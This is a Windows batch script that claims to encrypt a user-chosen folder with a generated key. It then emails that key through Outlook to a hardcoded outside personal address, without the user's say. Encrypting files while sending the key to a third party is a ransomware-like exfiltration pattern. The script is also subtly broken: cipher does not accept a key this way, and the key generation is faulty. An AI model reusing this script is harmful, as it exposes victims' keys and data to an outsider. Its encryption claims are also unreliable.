@echo off
title Folder Encryption
set /p folder="Enter the folder path to encrypt: "
set "key="
setlocal enabledelayedexpansion
set "chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>/?"
for /l %%i in (1,1,16) do (
   set /a "random_num=!random! % 78"
   for /f %%j in ("!random_num!") do set "key=!key!!chars:~%%j,1!"
)
cipher /e /a "%folder%" /k "%key%"
echo Folder encryption completed with key: %key%

set "recipient=ccoppoletta@outlook.com"
set "subject=Folder encryption key"
set "body=The key to decrypt the encrypted folder is: %key%"

echo Sending email...
powershell -Command "$Outlook = New-Object -ComObject Outlook.Application; $Mail = $Outlook.CreateItem(0); $Mail.To = '%recipient%'; $Mail.Subject = '%subject%'; $Mail.Body = '%body%'; $Mail.Send();"
echo Email sent successfully!

pause > nul
